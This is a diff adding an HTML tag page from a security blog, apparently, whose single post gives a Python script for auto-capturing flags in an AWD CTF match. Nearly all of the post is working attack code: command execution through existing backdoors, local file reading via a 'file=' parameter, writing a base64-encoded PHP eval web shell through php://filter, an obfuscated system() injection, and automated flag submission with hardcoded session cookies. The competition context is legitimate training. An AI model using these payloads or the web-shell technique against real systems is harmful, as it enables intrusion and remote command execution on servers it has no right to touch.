@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>AWD :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/tags/awd/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="AWD">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/tags/awd/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/tags/awd/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/awd-flag-script/">AWD FLAG SCRIPT</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-04-22 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/awd/">AWD</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctf/">CTF</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="awd-flag脚本">AWD FLAG脚本</h1>
+<p>之前AWD的自动写🐴获取flag脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filename</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">+</span>str(int(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">10000000</span>, <span style="color:#ae81ff">99999999</span>)))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp1</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/test.php&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp2</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/about.php?file=/flag&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp3</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/editor.php&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;boy&#34;</span>:<span style="color:#e6db74">&#34;cat /flag&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp4</span>(target):
+</span></span><span style="display:flex;"><span>    Filename <span style="color:#f92672">=</span> filename()
+</span></span><span style="display:flex;"><span>    write_backdoor_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/type.php?m=sPD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=&#39;</span><span style="color:#f92672">+</span>Filename
+</span></span><span style="display:flex;"><span>    getflag_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/&#39;</span><span style="color:#f92672">+</span>Filename
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>write_backdoor_url)
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[+]Backdoor is Write in :&#34;</span><span style="color:#f92672">+</span>getflag_url
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>getflag_url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp5</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/articlelist.php?a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp6</span>(target):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/.aa&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit</span>(flag_value):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://x.x.x.x:8000/api/v1/challenges/attempt&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;challenge_id&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;submission&#34;</span>:flag_value})
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;CSRF-Token&#39;</span>: <span style="color:#e6db74">&#39;c7b3f18a7eac5935b8f4279e53be8824fc304d85599c6e5ebd9ae4e701bb640e&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000/challenges&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;zh-CN,zh;q=0.9&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;PHPSESSID=to9lsb0m9jrpv1hmdg37he5aa2; session=1f8b1fe6-ab39-4fa4-a03d-617a80f0b2b7&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>    req <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url,headers<span style="color:#f92672">=</span>headers,data<span style="color:#f92672">=</span>data,verify <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    print(req<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>):
+</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;x.x.x.x:3</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">80&#34;</span><span style="color:#f92672">.</span>format(str(i)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp1(ip)</span>
+</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> exp2(ip)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp3(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp4(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp5(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp6(ip)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># submit(flag)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));</span>
+</span></span></code></pre></div>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/awd-flag-script/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
